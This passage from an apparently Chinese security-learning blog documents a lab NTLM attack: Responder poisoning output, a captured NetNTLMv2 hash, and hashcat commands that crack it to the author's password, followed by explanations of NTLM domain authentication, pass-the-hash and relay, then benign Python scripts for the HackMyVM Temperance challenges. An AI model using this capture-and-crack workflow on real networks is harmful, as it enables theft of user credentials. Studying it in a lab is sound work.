<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.31.178  <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Skipping previously captured <span class="token builtin class-name">hash</span> <span class="token keyword">for</span> WIN-N5633OS4LCV<span class="token punctuation">\</span>test
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.31.178  <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.31.178 <span class="token keyword">for</span> name <span class="token number">111</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::4029:1fd8:cf61:59c2 <span class="token keyword">for</span> name <span class="token number">111</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.31.178  <span class="token keyword">for</span> name <span class="token number">111</span>.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.31.178 <span class="token keyword">for</span> name <span class="token number">111</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Skipping previously captured <span class="token builtin class-name">hash</span> <span class="token keyword">for</span> WIN-N5633OS4LCV<span class="token punctuation">\</span>test
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>NBT-NS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.31.178 <span class="token keyword">for</span> name WORKGROUP <span class="token punctuation">(</span>service: Browser Election<span class="token punctuation">)</span></code></pre>
<p><strong>test::WIN-N5633OS4LCV:dd1d9a13318cceaf:684964EF5F83B204EE0B30077A88052F:01010000000000008043172396A3DA0106380B005DCDDA4D00000000020008004E004E004C004E0001001E00570049004E002D004A004E004F00510042005A003100440036004B00390004003400570049004E002D004A004E004F00510042005A003100440036004B0039002E004E004E004C004E002E004C004F00430041004C00030014004E004E004C004E002E004C004F00430041004C00050014004E004E004C004E002E004C004F00430041004C00070008008043172396A3DA0106000400020000000800300030000000000000000000000000200000CC6D994464DFABE76848136D66BF3068E7689FA0E037ECFFB9164FE9EECBE5B20A001000000000000000000000000000000000000900100063006900660073002F003100310031000000000000000000</strong><br>这个就是NTLM v2 Hash值<br>尝试用hashcat爆破一下，先把hash值保存在b.txt</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># hashcat b.txt /usr/share/wordlists/rockyou.txt --force -m 5600       </span>
hashcat <span class="token punctuation">(</span>v6.2.6<span class="token punctuation">)</span> starting

You have enabled <span class="token parameter variable">--force</span> to bypass dangerous warnings and errors<span class="token operator">!</span>
This can hide serious problems and should only be <span class="token keyword">done</span> when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API <span class="token punctuation">(</span>OpenCL <span class="token number">3.0</span> PoCL <span class="token number">5.0</span>+debian  Linux, None+Asserts, RELOC, SPIR, LLVM <span class="token number">16.0</span>.6, SLEEF, DISTRO, POCL_DEBUG<span class="token punctuation">)</span> - Platform <span class="token comment">#1 [The pocl project]</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
* Device <span class="token comment">#1: cpu-haswell-12th Gen Intel(R) Core(TM) i7-12700H, 1142/2349 MB (512 MB allocatable), 1MCU</span>

Minimum password length supported by kernel: <span class="token number">0</span>
Maximum password length supported by kernel: <span class="token number">256</span>

Hashes: <span class="token number">1</span> digests<span class="token punctuation">;</span> <span class="token number">1</span> unique digests, <span class="token number">1</span> unique salts
Bitmaps: <span class="token number">16</span> bits, <span class="token number">65536</span> entries, 0x0000ffff mask, <span class="token number">262144</span> bytes, <span class="token number">5</span>/13 rotates
Rules: <span class="token number">1</span>

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION<span class="token operator">!</span> Pure <span class="token punctuation">(</span>unoptimized<span class="token punctuation">)</span> backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append <span class="token parameter variable">-O</span> to your commandline.
See the above message to <span class="token function">find</span> out about the exact limits.

Watchdog: Temperature abort trigger <span class="token builtin class-name">set</span> to 90c

Host memory required <span class="token keyword">for</span> this attack: <span class="token number">0</span> MB

Dictionary cache built:
* Filename<span class="token punctuation">..</span>: /usr/share/wordlists/rockyou.txt
* Passwords.: <span class="token number">14344393</span>
* Bytes<span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">139921511</span>
* Keyspace<span class="token punctuation">..</span>: <span class="token number">14344386</span>
* Runtime<span class="token punctuation">..</span>.: <span class="token number">0</span> secs

TEST::WIN-N5633OS4LCV:dd1d9a13318cceaf:684964ef5f83b204ee0b30077a88052f:01010000000000008043172396a3da0106380b005dcdda4d00000000020008004e004e004c004e0001001e00570049004e002d004a004e004f00510042005a003100440036004b00390004003400570049004e002d004a004e004f00510042005a003100440036004b0039002e004e004e004c004e002e004c004f00430041004c00030014004e004e004c004e002e004c004f00430041004c00050014004e004e004c004e002e004c004f00430041004c00070008008043172396a3da0106000400020000000800300030000000000000000000000000200000cc6d994464dfabe76848136d66bf3068e7689fa0e037ecffb9164fe9eecbe5b20a001000000000000000000000000000000000000900100063006900660073002f003100310031000000000000000000:qweasd
                                                          
Session<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: hashcat
Status<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: Cracked
Hash.Mode<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">5600</span> <span class="token punctuation">(</span>NetNTLMv2<span class="token punctuation">)</span>
Hash.Target<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: TEST::WIN-N5633OS4LCV:dd1d9a13318cceaf:684964ef5f83<span class="token punctuation">..</span>.000000
Time.Started<span class="token punctuation">..</span><span class="token punctuation">..</span>.: Sat May <span class="token number">11</span> <span class="token number">11</span>:33:30 <span class="token number">2024</span>, <span class="token punctuation">(</span><span class="token number">1</span> sec<span class="token punctuation">)</span>
Time.Estimated<span class="token punctuation">..</span>.: Sat May <span class="token number">11</span> <span class="token number">11</span>:33:31 <span class="token number">2024</span>, <span class="token punctuation">(</span><span class="token number">0</span> secs<span class="token punctuation">)</span>
Kernel.Feature<span class="token punctuation">..</span>.: Pure Kernel
Guess.Base<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: File <span class="token punctuation">(</span>/usr/share/wordlists/rockyou.txt<span class="token punctuation">)</span>
Guess.Queue<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
Speed.<span class="token comment">#1.........:   525.0 kH/s (0.35ms) @ Accel:256 Loops:1 Thr:1 Vec:8</span>
Recovered<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>total<span class="token punctuation">)</span>, <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>new<span class="token punctuation">)</span>
Progress<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">3072</span>/14344386 <span class="token punctuation">(</span><span class="token number">0.02</span>%<span class="token punctuation">)</span>
Rejected<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">0</span>/3072 <span class="token punctuation">(</span><span class="token number">0.00</span>%<span class="token punctuation">)</span>
Restore.Point<span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">2816</span>/14344386 <span class="token punctuation">(</span><span class="token number">0.02</span>%<span class="token punctuation">)</span>
Restore.Sub.<span class="token comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span>
Candidate.Engine.: Device Generator
Candidates.<span class="token comment">#1....: pirate -> dangerous</span>
Hardware.Mon.<span class="token comment">#1..: Util: 57%</span>

Started: Sat May <span class="token number">11</span> <span class="token number">11</span>:33:29 <span class="token number">2024</span>
Stopped: Sat May <span class="token number">11</span> <span class="token number">11</span>:33:31 <span class="token number">2024</span></code></pre>
<p>其中-m 5600  指定是NTLM v2模式，结果可以看出爆破成功，–show一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># hashcat b.txt /usr/share/wordlists/rockyou.txt --force -m 5600 --show</span>
TEST::WIN-N5633OS4LCV:dd1d9a13318cceaf:684964ef5f83b204ee0b30077a88052f:01010000000000008043172396a3da0106380b005dcdda4d00000000020008004e004e004c004e0001001e00570049004e002d004a004e004f00510042005a003100440036004b00390004003400570049004e002d004a004e004f00510042005a003100440036004b0039002e004e004e004c004e002e004c004f00430041004c00030014004e004e004c004e002e004c004f00430041004c00050014004e004e004c004e002e004c004f00430041004c00070008008043172396a3da0106000400020000000800300030000000000000000000000000200000cc6d994464dfabe76848136d66bf3068e7689fa0e037ecffb9164fe9eecbe5b20a001000000000000000000000000000000000000900100063006900660073002f003100310031000000000000000000:qweasd</code></pre>
<p><code>qweasd</code>就是我设置win10的密码</p>
<h1 id="域环境下的NTLM-认证"><a href="#域环境下的NTLM-认证" class="headerlink" title="域环境下的NTLM 认证"></a>域环境下的NTLM 认证</h1><p><img src="https://ooo.0x0.ooo/2024/05/11/OJBIdS.png" alt="OJBIdS.png" loading="lazy"></p>
<ol>
<li>客户端想要访问服务器的某个服务，需要进行身份认证。于是，在输人服务器的用户名和密码进行验证之后，客户端会缓存服务器密码的<strong>NTLM Hash</strong>值。然后，客户端会向服务端发送一个请求，该请求利用<strong>NTLM SSP</strong>生成<strong>NTLMSSP_NEGOTIATE</strong>消息(Type1)。</li>
<li>服务端接收到客户端发送过来的Type1消息，会读取其中的内容，并从中选择自己所能接受的服务内容、加密等级、安全服务等。然后传人NTLM SSP,得到<strong>NTLMSSP_CHALLENGE</strong>消息(Type2)，并将此Type2消息发回给客户端。在此Typc2消息中包含一个由服务端生成的16位随机值，被称为<strong>Challenge</strong>值，服务端将该<strong>Challenge</strong>值缓存起来。</li>
<li>客户端收到服务端返回的Iype2消息后，读取服务端所支持的内容，并取出其中的<strong>Challenge</strong>值，用缓存的服务器密码的NTLM Hash对其进行加密得到<strong>Response</strong>消息，<strong>Response</strong>消息中可以提取出<strong>Net-NTLM Hash</strong>。最后将Response和一些其他信息封装到<strong>NTLMSSP_AUTH</strong>消息中(Type3)，发往服务端。<br>以上过程与工作组下NTLM协议认证机制一样，以下过程与域控(DC)有关</li>
<li>服务端接收到客户端发送来的<strong>NTLMSSP_AUTH</strong>认证消息后，通过<strong>Netlogon协议</strong>与域控制器(Domain Controller,DC,简称域控)建立一个安全通道，将验证消息发给域控。</li>
<li>域控收到服务端发来的验证消息后，从中取出<strong>Net-NTLM Hash</strong>。然后从<strong>数据库</strong>中找到该用户的<strong>NTLM Hash</strong>,对<strong>Challenge</strong>进行一系列加密运算，得到自己计算的<strong>Net-NTLMHash</strong>,比较自已计算出的<strong>Net-NTLM Hash</strong>和服务端发送的<strong>Net-NTLM Hash</strong>是否相等，如果相等，则证明客户端输人的密码正确，认证成功，反之认证失败，域控将验证结果发给服务端。</li>
<li>服务端根据域控返回的结果，对客户端进行回复。</li>
</ol>
<p>其实，域环境下的NTLM协议认证与工作组下没有什么区别，就是在<strong>Response</strong>的认证过程由域控承担。<br>这个实验先不做(其实是我的环境还没搭建好)</p>
<h1 id="NTLM-v1和NTLM-v2的区别"><a href="#NTLM-v1和NTLM-v2的区别" class="headerlink" title="NTLM v1和NTLM v2的区别"></a>NTLM v1和NTLM v2的区别</h1><p>前面说过，NTLM v1和NTLM v2最大的区别就是<code>Challenge</code>值与加密算法的不同。</p>
<ol>
<li>Challenge值<br>NTLM v1: 8B<br>NTLM v2：16B</li>
<li>加密算法<br> NTLM v1: DES加密算法<br> NTLM v2: HMAC-MD5加密算法</li>
<li>Net-NTLM v1的Hash格式<br>username:hostname:LM response:NTLM response:challenge</li>
</ol>
<h1 id="LmCompatibilityLevel"><a href="#LmCompatibilityLevel" class="headerlink" title="LmCompatibilityLevel"></a>LmCompatibilityLevel</h1><p><strong>LmCompatibilityLevel</strong>的值用来确定网络登录使用的Challenge&#x2F;Response身份验证协议。<br>LmCompatibilityLevel值对应的含义<br>0: 客户端使用LM和NTLM身份验证，但从不使用NTLM v2会话安全性。域控接受LM、NTLM和NTLM v2身份验证。<br>1: 客户端使用LM和NTLM身份验证，如果服务器支持NTLM v2会话安全性，则使用NTLM v2,域控接受LM、NTLM和NTLM v2身份验证。<br>2: 客户端使用NTLM身份验证，如果服务器支持NTLM v2会话安全性，则使用NTLM v2,域控接受LM、NTLM和NTLM v2身份验证。<br>3: 客户端仅使用NTLM v2身份验证，如果服务器支持NTLM v2会话安全性，则使用NTLM v2,域控接受LM、NTLM和NTLM v2身份验证。<br>4: 客户端仅使用NTLM v2身份验证，如果服务器支持NTLM v2会话安全性，则使用NTLM v2,域控拒绝LM身份验证，但接受NTLM和NTLM v2身份验证。<br>5: 客户端仅使用NTLM v2身份验证，如果服务器支持NTLM v2会话安全性，则使用NTLM v2,域控拒绝LM和NTLM身份验证，但接受NTLM v2身份验证。</p>
<p>在本地可以修改<strong>LmCompatibilityLevel</strong>的值<br><img src="https://ooo.0x0.ooo/2024/05/11/OJBIdS.png" alt="OJBIdS.png" loading="lazy"><img src="https://ooo.0x0.ooo/2024/05/11/OJU2BK.png" alt="OJU2BK.png" loading="lazy"><br>默认是没有值的，可以自行修改。</p>
<h1 id="NTLM协议的安全问题"><a href="#NTLM协议的安全问题" class="headerlink" title="NTLM协议的安全问题"></a>NTLM协议的安全问题</h1><p>上面说过Type3 <code>NTLMSSP_AUTH</code>是使用用户密码进行计算的。因此，当没有拿到用户密码明文只拿到hash的时候可以进行<code>PTH</code>(Pass The Hash)(哈希传递)攻击。同样，在Response中存在<code>Net-NTLM Hash</code>，当获取到<code>Net-NTLM Hash</code>，可以进行中间人攻击，重放<code>Net-NTLM Hash</code>，这种就是NTLM Relay(NTLM 中继)攻击。由于NTLM v1协议加密过程存在天然缺陷，因此可以对Net-NTLM Hash进行破解，得到NTLM Hash后就可以横向。</p>
<ol>
<li><strong>Pass The Hash</strong><br>Pass The Hash是内网横向攻击的一种方式。当获取到用户密码的NTLM Hash，对内网其他用户进行Hash碰撞，碰撞到使用相同密码的机器。然后通过135或445端口横向移动到使用该密码的机器。</li>
<li><strong>NTLM Relay</strong><br>上面使用<code>Responder</code>获取<code>Net-NTLM Hash</code>就是一种NTLM中继攻击，</li>
<li><strong>Net-NTLM v1 Hash破解</strong><br>只要获取到<code>Net-NTLM v1 Hash</code>就能破解为<code>NTLM Hash</code>，这与密码强度无关。在域环境，可以直接使用NTLM Hash连接。</li>
</ol>
<p>NTLM协议暂且学到这。后续还会进行不同类型的攻击实验。</p>
]]></content>
      <categories>
        <category>AD域</category>
      </categories>
      <tags>
        <tag>windows协议</tag>
      </tags>
  </entry>
  <entry>
    <title>lab-Temperance</title>
    <url>/posts/45ea257e/</url>
    <content><![CDATA[<h2 id="levelx00-输入给定字符串"><a href="#levelx00-输入给定字符串" class="headerlink" title="levelx00  输入给定字符串"></a>levelx00  输入给定字符串</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> base64

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>

<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Connect to the host and receive the message / Conecta al host y recibes la intro general.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>

    <span class="token comment"># Send "levelx00" to choose the level / Envia levelx00 para elegir el nivel.</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'levelx00'</span><span class="token punctuation">)</span>

    <span class="token comment"># Receive the challenge / Recibe el challenge.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>

    <span class="token comment"># Send the challenge solved / Envia el resultado del challenge.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Envio reto'</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data2<span class="token punctuation">)</span>

    <span class="token comment"># Receive the flag / Recibe la flag.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Recibo flag'</span><span class="token punctuation">)</span>
    data3 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span></code></pre>
<h2 id="levelx01-输入给定两个字符串"><a href="#levelx01-输入给定两个字符串" class="headerlink" title="levelx01 输入给定两个字符串"></a>levelx01 输入给定两个字符串</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>

<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Connect to the host and receive the message / Conecta al host y recibes la intro general.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>

    <span class="token comment"># Send "levelx00" to choose the level / Envia levelx00 para elegir el nivel.</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'levelx01'</span><span class="token punctuation">)</span>

    <span class="token comment"># Receive the challenge / Recibe el challenge.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>

    <span class="token comment"># Send the challenge solved / Envia el resultado del challenge.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Envio reto'</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data2<span class="token punctuation">)</span>

    data3 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    <span class="token comment"># Receive the flag / Recibe la flag.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Recibo flag'</span><span class="token punctuation">)</span>
    data3 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span></code></pre>
<h2 id="levelx02-字符串全大写"><a href="#levelx02-字符串全大写" class="headerlink" title="levelx02 字符串全大写"></a>levelx02 字符串全大写</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>

<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Connect to the host and receive the message / Conecta al host y recibes la intro general.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>

    <span class="token comment"># Send "levelx00" to choose the level / Envia levelx00 para elegir el nivel.</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'levelx02'</span><span class="token punctuation">)</span>

    <span class="token comment"># Receive the challenge / Recibe el challenge.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>

    <span class="token comment"># Send the challenge solved / Envia el resultado del challenge.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Envio reto'</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data2<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># Receive the flag / Recibe la flag.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Recibo flag'</span><span class="token punctuation">)</span>
    data3 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span></code></pre>
<h2 id="levelx03-base64解码"><a href="#levelx03-base64解码" class="headerlink" title="levelx03 base64解码"></a>levelx03 base64解码</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> base64

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>

<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Connect to the host and receive the message / Conecta al host y recibes la intro general.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>

    <span class="token comment"># Send "levelx00" to choose the level / Envia levelx00 para elegir el nivel.</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'levelx03'</span><span class="token punctuation">)</span>

    <span class="token comment"># Receive the challenge / Recibe el challenge.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>

    <span class="token comment"># Send the challenge solved / Envia el resultado del challenge.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Envio reto'</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data2<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># Receive the flag / Recibe la flag.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Recibo flag'</span><span class="token punctuation">)</span>
    data3 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
